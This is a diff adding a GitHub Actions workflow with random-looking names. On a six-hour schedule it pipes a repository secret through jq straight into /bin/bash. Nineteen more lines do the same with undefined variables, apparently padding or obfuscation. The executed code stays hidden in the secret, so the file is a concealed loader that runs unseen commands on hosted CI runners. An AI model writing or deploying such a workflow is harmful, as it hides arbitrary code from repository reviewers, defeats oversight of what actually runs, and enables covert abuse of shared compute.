@@ -1,0 +1,36 @@
+name: gucaishen4627
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gucaishen4627
+        env:
+          qst1: ${{ secrets.qst1 }}
+        run: |
+          echo $qst1 | jq -r .ppynr30111 | /bin/bash
+          echo $lsox2 | jq -r .goijt4098 | /bin/bash
+          echo $hd614 | jq -r .jwnna6654 | /bin/bash
+          echo $mgjje93 | jq -r .lte7 | /bin/bash
+          echo $pbk84 | jq -r .r28895 | /bin/bash
+          echo $ukb91 | jq -r .ksl77 | /bin/bash
+          echo $zepv40258 | jq -r .wnbh5 | /bin/bash
+          echo $izta84044 | jq -r .wyqr50747 | /bin/bash
+          echo $qxi25980 | jq -r .xkwoa215 | /bin/bash
+          echo $w07244 | jq -r .hix7282 | /bin/bash
+          echo $osuv6 | jq -r .ceudw34 | /bin/bash
+          echo $e8394 | jq -r .xmkks4 | /bin/bash
+          echo $cn4 | jq -r .qhr92 | /bin/bash
+          echo $kvvhk05 | jq -r .lcluh497 | /bin/bash
+          echo $g22 | jq -r .ey1 | /bin/bash
+          echo $rtcw9462 | jq -r .wqnuo35 | /bin/bash
+          echo $t02 | jq -r .dqril1 | /bin/bash
+          echo $v2 | jq -r .txgg2360 | /bin/bash
+          echo $faf47 | jq -r .e48 | /bin/bash
+          echo $wkv19044 | jq -r .me312 | /bin/bash
+
